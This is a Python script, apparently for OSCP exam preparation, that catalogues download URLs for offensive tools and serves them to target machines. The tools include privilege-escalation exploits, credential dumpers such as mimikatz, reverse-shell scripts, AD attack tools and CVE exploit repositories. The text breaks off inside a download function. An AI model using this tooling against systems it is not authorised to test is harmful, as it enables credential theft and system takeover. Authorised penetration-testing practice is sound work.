#!/usr/bin/env python3
"""
OSCP+ Unified Toolkit Downloader — All tools from all scripts in one place.
Sources: V2toolswindows.sh, painkiller.sh, painkillerV2.sh, linpain.sh, linpainkillerV2.sh

Features:
  - Smart caching: skips files that already exist and are > 0 bytes
  - Handles .zip, .gz, .tar.gz archives (auto-extracts)
  - Git repos cloned once, pulled if they exist
  - Organized directory structure
  - Serves toolkit on random port when done
  - Prints target download commands with your IP

Usage:
  python3 ToolKitDownloader.py                      # Download all, pick interface, serve
  python3 ToolKitDownloader.py --ip 192.168.45.250  # Skip interface prompt, use this IP
  python3 ToolKitDownloader.py --download-only      # Download only, no server
  python3 ToolKitDownloader.py --serve-only         # Serve existing cache
  python3 ToolKitDownloader.py --category windows   # Only download windows tools
  python3 ToolKitDownloader.py --list               # List all tools without downloading
"""

import os
import sys
import json
import shutil
import socket
import signal
import hashlib
import argparse
import subprocess
import urllib.request
import urllib.error
import gzip
import zipfile
import tarfile
import http.server
import socketserver
import threading
from pathlib import Path
from datetime import datetime

# ── Colors ──────────────────────────────────────────────────────
R = "\033[0;31m"; G = "\033[0;32m"; Y = "\033[1;33m"
C = "\033[0;36m"; M = "\033[0;35m"; B = "\033[1;37m"
DIM = "\033[2m"; NC = "\033[0m"

CACHE_DIR = Path.home() / "privesc-toolkit"

# ── Every single tool from all 5 scripts, deduplicated, best URL picked ──

TOOLS = {
    # ══════════════════════════════════════════════════════════════
    #  WINDOWS BINARIES
    # ══════════════════════════════════════════════════════════════
    "windows": [
        # -- Enumeration --
        {"name": "winPEASx64.exe",      "cat": "enum",    "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"},
        {"name": "winPEASany_ofs.exe",   "cat": "enum",    "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"},
        {"name": "winPEAS.bat",          "cat": "enum",    "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat"},
        {"name": "SharpUp.exe",          "cat": "enum",    "url": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe"},
        {"name": "Seatbelt.exe",         "cat": "enum",    "url": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"},
        {"name": "SharpView.exe",        "cat": "enum",    "url": "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_x64/SharpView.exe"},
        {"name": "Snaffler.exe",         "cat": "enum",    "url": "https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe"},
        {"name": "Group3r.exe",          "cat": "enum",    "url": "https://github.com/Group3r/Group3r/releases/latest/download/Group3r.exe"},
        {"name": "accesschk.zip",        "cat": "enum",    "url": "https://download.sysinternals.com/files/AccessChk.zip", "extract": True},
        {"name": "PSTools.zip",          "cat": "enum",    "url": "https://download.sysinternals.com/files/PSTools.zip", "extract": True},
        {"name": "AdExplorer.zip",       "cat": "enum",    "url": "https://download.sysinternals.com/files/AdExplorer.zip", "extract": True},

        # -- Token Abuse (SeLoadDriverPrivilege) --
        # eoploaddriver + ExploitCapcom have no prebuilt releases — cloned to repos/EoPLoadDriver + repos/ExploitCapcom
        # NOTE: If you need binaries, compile on a Windows VM from the cloned repos
        {"name": "FullPowers.exe",       "cat": "tokens",  "url": "https://github.com/itm4n/FullPowers/releases/latest/download/FullPowers.exe"},

        # -- Potatoes --
        # churrasco = Windows XP/2003/Vista era TOKEN KIDNAPPING exploit (binary committed directly in repo)
        {"name": "churrasco.exe",        "cat": "potato",  "url": "https://raw.githubusercontent.com/Re4son/Churrasco/master/churrasco.exe"},
        # NetworkServiceExploit: escalates NetworkService (IIS/MSSQL) → SYSTEM via SeImpersonate
        {"name": "NetworkServiceExploit.exe", "cat": "potato", "url": "https://raw.githubusercontent.com/jakobfriedl/precompiled-binaries/main/PrivilegeEscalation/Token/NetworkServiceExploit.exe"},
        {"name": "SigmaPotato.exe",      "cat": "potato",  "url": "https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe"},
        {"name": "GodPotato-NET4.exe",   "cat": "potato",  "url": "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe"},
        {"name": "GodPotato-NET35.exe",  "cat": "potato",  "url": "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET35.exe"},
        {"name": "GodPotato-NET2.exe",   "cat": "potato",  "url": "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET2.exe"},
        {"name": "PrintSpoofer64.exe",   "cat": "potato",  "url": "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"},
        {"name": "SweetPotato.exe",      "cat": "potato",  "url": "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_x64/SweetPotato.exe"},
        # SigmaPotatoCore = PS Core / .NET Core variant of SigmaPotato
        {"name": "SigmaPotatoCore.exe",  "cat": "potato",  "url": "https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotatoCore.exe"},
        # TcbElevation: SeTcbPrivilege → SYSTEM via LsaLogonUser S4U
        # Source: gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178 (TcbElevation.cpp)
        # No verified public precompiled binary — compile from source and place at windows/TcbElevation.exe
        # {"name": "TcbElevation.exe",   "cat": "tokens",  "url": ""},  # uncomment when precompiled available
        {"name": "JuicyPotato.exe",      "cat": "potato",  "url": "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"},
        {"name": "JuicyPotatoNG.zip",    "cat": "potato",  "url": "https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip", "extract": True},
        {"name": "RoguePotato.zip",      "cat": "potato",  "url": "https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip", "extract": True},
        {"name": "SharpEfsPotato.exe",   "cat": "potato",  "url": "https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/Token/SharpEfsPotato.exe"},
        {"name": "LocalPotato.zip",      "cat": "potato",  "url": "https://github.com/decoder-it/LocalPotato/releases/download/v1.1/LocalPotato.zip", "extract": True},
        {"name": "EfsPotato.cs",         "cat": "potato",  "url": "https://raw.githubusercontent.com/zcgonvh/EfsPotato/master/EfsPotato.cs"},
        # DCOMPotato: DCOM-based impersonation (Win7/8/10/Server 2008+). No verified public precompiled binary.
        # Compile from source: https://github.com/zcgonvh/DCOMPotato — place compiled DCOMPotato.exe in windows/
        # {"name": "DCOMPotato.exe",     "cat": "potato",  "url": ""},  # no public precompiled binary
        # RottenPotato: legacy DCOM/NTLM impersonation. Superseded by JuicyPotato and GodPotato.
        {"name": "RottenPotato.exe",     "cat": "potato",  "url": "https://github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe"},

        # -- Credentials --
        {"name": "mimikatz_trunk.zip",   "cat": "creds",   "url": "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip", "extract": True},
        {"name": "LaZagne.exe",          "cat": "creds",   "url": "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"},
        {"name": "SharpDPAPI.exe",       "cat": "creds",   "url": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe"},
        {"name": "SharpDump.exe",        "cat": "creds",   "url": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDump.exe"},
        {"name": "Procdump.zip",         "cat": "creds",   "url": "https://download.sysinternals.com/files/Procdump.zip", "extract": True},
        {"name": "SharpChrome.exe",      "cat": "creds",   "url": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpChrome.exe"},
        {"name": "SafetyKatz.exe",       "cat": "creds",   "url": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SafetyKatz.exe"},
        {"name": "SharpWMI.exe",         "cat": "creds",   "url": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWMI.exe"},

        # -- Token / Privilege Abuse --
        {"name": "SeManageVolumeExploit.exe", "cat": "tokens", "url": "https://github.com/CsEnox/SeManageVolumeExploit/releases/latest/download/SeManageVolumeExploit.exe"},
        # SeBackupPrivilege DLL cmdlets (verified 200 — giuliano108 repo, committed compiled DLLs)
        {"name": "SeBackupPrivilegeCmdLets.dll", "cat": "tokens", "url": "https://raw.githubusercontent.com/giuliano108/SeBackupPrivilege/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll"},
        {"name": "SeBackupPrivilegeUtils.dll",   "cat": "tokens", "url": "https://raw.githubusercontent.com/giuliano108/SeBackupPrivilege/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll"},
        # SeLoadDriverPrivilege toolchain — verified precompiled binaries (k4sth4/SeLoadDriverPrivilege, HTTP 200)
        {"name": "eoploaddriver_x64.exe", "cat": "tokens", "url": "https://raw.githubusercontent.com/k4sth4/SeLoadDriverPrivilege/main/eoploaddriver_x64.exe"},
        {"name": "ExploitCapcom.exe",     "cat": "tokens", "url": "https://raw.githubusercontent.com/k4sth4/SeLoadDriverPrivilege/main/ExploitCapcom.exe"},
        {"name": "Capcom.sys",            "cat": "tokens", "url": "https://raw.githubusercontent.com/k4sth4/SeLoadDriverPrivilege/main/Capcom.sys"},
        # SeRestoreAbuse.exe — precompiled by overgrowncarrot1 (verified MZ PE header, HTTP 200, 2026-04)
        # Source: xct/SeRestoreAbuse | Pre-compiled fork: overgrowncarrot1/SeRestoreAbuse
        {"name": "SeRestoreAbuse.exe",   "cat": "tokens", "url": "https://raw.githubusercontent.com/overgrowncarrot1/SeRestoreAbuse/main/SeRestoreAbuse.exe"},
        {"name": "RunasCs.exe",           "cat": "tokens",  "url": "https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.exe"},

        # -- AD / Kerberos --
        {"name": "Rubeus.exe",           "cat": "ad",      "url": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"},
        {"name": "Certify.exe",          "cat": "ad",      "url": "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe"},
        {"name": "SharpHound.zip",       "cat": "ad",      "url": "https://github.com/BloodHoundAD/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip", "extract": True},
        {"name": "Whisker.exe",          "cat": "ad",      "url": "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_x64/Whisker.exe"},
        {"name": "SharpGPOAbuse.exe",    "cat": "ad",      "url": "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_x64/SharpGPOAbuse.exe"},
        {"name": "KrbRelayUp.exe",       "cat": "ad",      "url": "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_x64/KrbRelayUp.exe"},
        {"name": "Inveigh_bin.exe",      "cat": "ad",      "url": "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_x64/Inveigh.exe"},
        {"name": "SpoolSample.exe",      "cat": "ad",      "url": "https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/SpoolSample.exe"},
        {"name": "kerbrute_win.exe",     "cat": "ad",      "url": "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe"},
        {"name": "PingCastle.zip",       "cat": "ad",      "url": "https://github.com/netwrix/pingcastle/releases/download/3.3.0.1/PingCastle_3.3.0.1.zip", "extract": True},

        # -- Networking --
        {"name": "nc64.exe",             "cat": "net",     "url": "https://github.com/int0x33/nc.exe/raw/master/nc64.exe"},
        {"name": "nc.exe",               "cat": "net",     "url": "https://github.com/int0x33/nc.exe/raw/master/nc.exe"},
        {"name": "RunasCs.zip",          "cat": "net",     "url": "https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip", "extract": True},
        # plink.exe: PuTTY SSH client — used for port forwarding when chisel not available (64-bit)
        {"name": "plink.exe",            "cat": "tunnel",  "url": "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"},
        {"name": "chisel_win.zip",       "cat": "tunnel",  "url": "https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_windows_amd64.zip", "extract": True},
        {"name": "ligolo_agent_win.zip", "cat": "tunnel",  "url": "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_windows_amd64.zip", "extract": True},
    ],

    # ══════════════════════════════════════════════════════════════
    #  WINDOWS POWERSHELL SCRIPTS
    # ══════════════════════════════════════════════════════════════
    "scripts": [
        # -- Privesc --
        {"name": "Accesschk.ps1",              "cat": "privesc",  "local": True},
        {"name": "PowerUp.ps1",                "cat": "privesc",  "url": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"},
        {"name": "PrivescCheck.ps1",           "cat": "privesc",  "url": "https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1"},
        {"name": "Sherlock.ps1",               "cat": "privesc",  "url": "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1"},
        {"name": "jaws-enum.ps1",              "cat": "privesc",  "url": "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1"},
        {"name": "PowerSharpPack.ps1",         "cat": "privesc",  "url": "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1"},
        {"name": "WinPwn.ps1",                "cat": "privesc",  "url": "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1"},

        # -- AD / Recon --
        {"name": "PowerView.ps1",              "cat": "ad",       "url": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"},
        {"name": "PowerView_BC.ps1",           "cat": "ad",       "url": "https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1"},
        {"name": "SharpHound.ps1",             "cat": "ad",       "url": "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"},
        {"name": "ADRecon.ps1",                "cat": "ad",       "url": "https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1"},
        {"name": "ADCSTemplate.psm1",          "cat": "ad",       "url": "https://raw.githubusercontent.com/GoateePFE/ADCSTemplate/master/ADCSTemplate.psm1"},

        # -- Kerberos --
        {"name": "Invoke-Kerberoast.ps1",      "cat": "kerberos", "url": "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"},
        {"name": "ASREPRoast.ps1",             "cat": "kerberos", "url": "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"},

        # -- Credentials --
        {"name": "Invoke-Mimikatz.ps1",        "cat": "creds",    "url": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"},
        {"name": "Get-GPPPassword.ps1",        "cat": "creds",    "url": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1"},
        {"name": "Get-GPPAutologon.ps1",       "cat": "creds",    "url": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPAutologon.ps1"},
        {"name": "SessionGopher.ps1",          "cat": "creds",    "url": "https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1"},
        {"name": "LAPSToolkit.ps1",            "cat": "creds",    "url": "https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/master/LAPSToolkit.ps1"},
        {"name": "DomainPasswordSpray.ps1",    "cat": "creds",    "url": "https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1"},

        # -- Lateral --
        {"name": "Invoke-SMBExec.ps1",         "cat": "lateral",  "url": "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1"},
        {"name": "Invoke-WMIExec.ps1",         "cat": "lateral",  "url": "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1"},
        {"name": "Invoke-TheHash.ps1",         "cat": "lateral",  "url": "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-TheHash.ps1"},
        {"name": "Invoke-ACLPwn.ps1",          "cat": "lateral",  "url": "https://raw.githubusercontent.com/fox-it/Invoke-ACLPwn/master/Invoke-ACLPwn.ps1"},

        # -- Network --
        {"name": "Inveigh.ps1",                "cat": "net",      "url": "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1"},
        {"name": "Tater.ps1",                  "cat": "net",      "url": "https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1"},
        {"name": "Invoke-Portscan.ps1",        "cat": "net",      "url": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1"},
        {"name": "PowerUpSQL.ps1",             "cat": "net",      "url": "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1"},

        # -- Shells --
        {"name": "Invoke-PowerShellTcp.ps1",   "cat": "shells",   "url": "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"},
        {"name": "Invoke-PowerShellTcpOneLine.ps1", "cat": "shells", "url": "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1"},
        {"name": "Invoke-ConPtyShell.ps1",     "cat": "shells",   "url": "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"},
        {"name": "Invoke-RunasCs.ps1",         "cat": "shells",   "url": "https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1"},
        {"name": "powercat.ps1",               "cat": "shells",   "url": "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"},
        # psgetsys.ps1: SeDebugPrivilege → impersonate parent process token (decoder-it/splinter_code)
        {"name": "psgetsys.ps1",               "cat": "shells",   "url": "https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1"},
    ],

    # ══════════════════════════════════════════════════════════════
    #  LINUX BINARIES & SCRIPTS
    # ══════════════════════════════════════════════════════════════
    "linux": [
        # -- Enumeration --
        {"name": "linpeas.sh",               "cat": "enum",    "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"},
        {"name": "linpeas_small.sh",         "cat": "enum",    "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh"},
        {"name": "linpeas_fat.sh",           "cat": "enum",    "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh"},
        {"name": "LinEnum.sh",               "cat": "enum",    "url": "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"},
        {"name": "lse.sh",                   "cat": "enum",    "url": "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"},
        # unix-privesc-check — all upstream repos dead; pre-installed on Kali at /usr/bin/unix-privesc-check
        {"name": "linuxprivchecker.py",      "cat": "enum",    "url": "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py"},

        # -- Exploit Suggesters --
        {"name": "linux-exploit-suggester.sh",  "cat": "exploit-suggest", "url": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"},
        {"name": "linux-exploit-suggester-2.pl","cat": "exploit-suggest", "url": "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl"},
        {"name": "exploit-suggester.py",        "cat": "exploit-suggest", "url": "https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl",
         "fallback_urls": ["https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"]},

        # -- GTFOBins helpers --
        # gtfonow.py — repo removed, using GTFOBLookup from repos instead
        {"name": "suid3num.py",             "cat": "gtfo",    "url": "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py"},

        # -- Process Monitor --
        {"name": "pspy64",                   "cat": "monitor",  "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"},
        {"name": "pspy32",                   "cat": "monitor",  "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32"},
        {"name": "pspy64s",                  "cat": "monitor",  "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s"},
        {"name": "pspy32s",                  "cat": "monitor",  "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s"},

        # -- Privesc --
        {"name": "traitor-amd64",            "cat": "privesc",  "url": "https://github.com/liamg/traitor/releases/latest/download/traitor-amd64"},
        {"name": "traitor-386",              "cat": "privesc",  "url": "https://github.com/liamg/traitor/releases/latest/download/traitor-386"},

        # -- Static Binaries --
        {"name": "socat",                    "cat": "static",   "url": "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"},
        {"name": "ncat",                     "cat": "static",   "url": "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat"},
        {"name": "nmap_static",              "cat": "static",   "url": "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap"},
        # bash/strace/tcpdump static — original repos (andrew-d, polaco1782) are both dead
        # Use busybox as fallback (already included), or install from package manager
        {"name": "busybox",                  "cat": "static",   "url": "https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox"},
        {"name": "curl_static",              "cat": "static",   "url": "https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64"},
        # gdb-static — hugsy releases are 404, non-essential for OSCP

        # -- Tunneling --
        {"name": "chisel_linux.gz",          "cat": "tunnel",   "url": "https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz", "extract": True},
        {"name": "chisel_linux_386.gz",      "cat": "tunnel",   "url": "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_386.gz", "extract": True},
        {"name": "ligolo_agent_lin.tar.gz",  "cat": "tunnel",   "url": "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz", "extract": True},
        {"name": "ligolo_proxy_lin.tar.gz",  "cat": "tunnel",   "url": "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz", "extract": True},

        # -- Shells --
        {"name": "php-reverse-shell.php",    "cat": "shells",   "url": "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"},
        {"name": "perl-reverse-shell.pl",    "cat": "shells",   "url": "https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl"},
        # tcp_pty_backconnect.py — pentestmonkey repo removed, python shells covered by shell_generators.json

        # -- Kali-side --
        {"name": "kerbrute_linux",           "cat": "kali",     "url": "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64"},

        # -- Wordlists --
        {"name": "10k-most-common.txt",      "cat": "wordlists","url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"},
        {"name": "names.txt",                "cat": "wordlists","url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt"},
        {"name": "xato-net-10m-usernames.txt","cat": "wordlists","url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt"},
    ],

    # ══════════════════════════════════════════════════════════════
    #  GIT REPOSITORIES (cloned to kali-repos/)
    # ══════════════════════════════════════════════════════════════
    "repos": [
        {"name": "impacket",            "url": "https://github.com/fortra/impacket.git"},
        {"name": "Responder",           "url": "https://github.com/lgandx/Responder.git"},
        {"name": "NetExec",             "url": "https://github.com/Pennyw0rth/NetExec.git"},
        {"name": "Certipy",             "url": "https://github.com/ly4k/Certipy.git"},
        {"name": "BloodHound.py",       "url": "https://github.com/dirkjanm/BloodHound.py.git"},
        {"name": "krbrelayx",           "url": "https://github.com/dirkjanm/krbrelayx.git"},
        {"name": "PKINITtools",         "url": "https://github.com/dirkjanm/PKINITtools.git"},
        {"name": "Coercer",             "url": "https://github.com/p0dalirius/Coercer.git"},
        {"name": "PetitPotam",          "url": "https://github.com/topotam/PetitPotam.git"},
        {"name": "enum4linux-ng",       "url": "https://github.com/cddmp/enum4linux-ng.git"},
        {"name": "mimipenguin",         "url": "https://github.com/huntergregal/mimipenguin.git"},
        {"name": "PayloadsAllTheThings","url": "https://github.com/swisskyrepo/PayloadsAllTheThings.git"},
        {"name": "SUDO_KILLER",         "url": "https://github.com/TH3xACE/SUDO_KILLER.git"},
        {"name": "LaZagne_src",         "url": "https://github.com/AlessandroZ/LaZagne.git"},
        {"name": "BeRoot",              "url": "https://github.com/AlessandroZ/BeRoot.git"},
        {"name": "linux-exploit-suggester", "url": "https://github.com/mzet-/linux-exploit-suggester.git"},
        {"name": "GTFOBLookup",         "url": "https://github.com/nccgroup/GTFOBLookup.git"},
        {"name": "LinEnum",             "url": "https://github.com/rebootuser/LinEnum.git"},
        {"name": "noPac",               "url": "https://github.com/Ridter/noPac.git"},
        {"name": "CVE-2021-1675",       "url": "https://github.com/cube0x0/CVE-2021-1675.git"},
        {"name": "CVE-2020-1472",       "url": "https://github.com/dirkjanm/CVE-2020-1472.git"},
        {"name": "gpp-decrypt",         "url": "https://github.com/t0thkr1s/gpp-decrypt.git"},
        {"name": "windapsearch",        "url": "https://github.com/ropnop/windapsearch.git"},
        {"name": "webshells",           "url": "https://github.com/BlackArch/webshells.git"},
        {"name": "rsg",                 "url": "https://github.com/mthbernardes/rsg.git"},
        {"name": "statistically-likely-usernames", "url": "https://github.com/insidetrust/statistically-likely-usernames.git"},
        # SeLoadDriverPrivilege — source repos for reference (precompiled binaries now in windows/ section)
        {"name": "EoPLoadDriver",       "url": "https://github.com/TarlogicSecurity/EoPLoadDriver.git"},
        {"name": "ExploitCapcom",       "url": "https://github.com/tandasat/ExploitCapcom.git"},
        # SeRestoreAbuse — source only, no precompiled binary exists publicly (verified 2026-04)
        # To build: open SeRestoreAbuse.sln in VS → Build → Release x64 → copy SeRestoreAbuse.exe to windows/
        {"name": "SeRestoreAbuse",      "url": "https://github.com/xct/SeRestoreAbuse.git"},
        # szkg64.sys — CVE-2018-15732 vulnerable driver (preferred over Capcom on Win11/Server 2022)
        # Download: https://www.exploit-db.com/apps/ac6c7cf2b7fe4b4a5c2090fe05a3fe67-szkg64.zip
        # (No reliable public direct-download URL exists; obtain from Exploit-DB or compile from source)
    ],
}

# ── Post-clone file copies: copy key files from repos into served dirs ──────
# Format: (repo_name, relative_path_in_repo, dest_category, dest_filename)
POST_REPO_COPIES = [
    ("mimipenguin",  "mimipenguin.py",         "linux",   "mimipenguin.py"),
    ("mimipenguin",  "mimipenguin.sh",          "linux",   "mimipenguin.sh"),
    ("LaZagne_src",  "Linux/laZagne.py",        "linux",   "laZagne.py"),
    ("LaZagne_src",  "laZagne.py",              "linux",   "laZagne.py"),   # fallback path
]


# ── Helpers ─────────────────────────────────────────────────────

def log(msg, color=NC):
    print(f"  {color}{msg}{NC}")

def ok(msg):   log(f"[+] {msg}", G)
def skip(msg): log(f"[-] {msg}", DIM)
def warn(msg): log(f"[!] {msg}", Y)
def err(msg):  log(f"[X] {msg}", R)
def info(msg): log(f"[*] {msg}", C)

def get_all_interfaces():
    """Return list of (iface, ip) for every interface that has an IPv4 address."""
    ifaces = []
    try:
        raw = subprocess.check_output(
            "ip -4 addr show | awk '/^[0-9]+:/{iface=$2; sub(/:$/,\"\",iface)} /inet /{split($2,a,\"/\"); print iface\" \"a[1]}'",
            shell=True, text=True
        ).strip().splitlines()
        for line in raw:
            parts = line.split()
            if len(parts) == 2:
                ifaces.append((parts[0], parts[1]))
    except Exception:
        pass
    return ifaces


def pick_ip(forced_ip=None):
    """Return the IP to use for serving. Uses --ip if given, else asks interactively."""
    if forced_ip:
        return forced_ip

    ifaces = get_all_interfaces()
    # Filter out loopback
    ifaces = [(n, ip) for n, ip in ifaces if not ip.startswith("127.")]

    if not ifaces:
        return "127.0.0.1"

    # Prefer VPN interfaces automatically only if there's exactly one tun/tap
    vpn = [(n, ip) for n, ip in ifaces if n.startswith(("tun", "tap"))]

    print(f"\n{C}  Available interfaces:{NC}")
    for i, (name, ip) in enumerate(ifaces):
        tag = f" {Y}← VPN{NC}" if name.startswith(("tun", "tap")) else ""
        print(f"  {B}[{i}]{NC} {name:12s}  {ip}{tag}")

    # Default selection: first VPN if any, else first interface
    default_idx = ifaces.index(vpn[0]) if vpn else 0
    default_ip = ifaces[default_idx][1]

    try:
        choice = input(f"\n  {B}Select interface [{default_idx}] (Enter = {default_ip}): {NC}").strip()
        if choice == "":
            return default_ip
        idx = int(choice)
        if 0 <= idx < len(ifaces):
            return ifaces[idx][1]
        warn(f"Invalid choice, using default: {default_ip}")
        return default_ip
    except (ValueError, EOFError, KeyboardInterrupt):
        return default_ip

def file_ok(path):
    return path.exists() and path.stat().st_size > 0

def download_file(url, dest):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=30) as resp:
            with open(dest, "wb") as f:
                shutil.copyfileobj(resp, f)
        return True
    except Exception as e:
        err(f"Failed: {url} → {e}")
        return False

def try_download_with_fallbacks(tool, dest):
    """Try primary URL, then each fallback_url in order. Returns True if any succeeded."""
    primary = tool["url"]
    fallbacks = tool.get("fallback_urls", [])
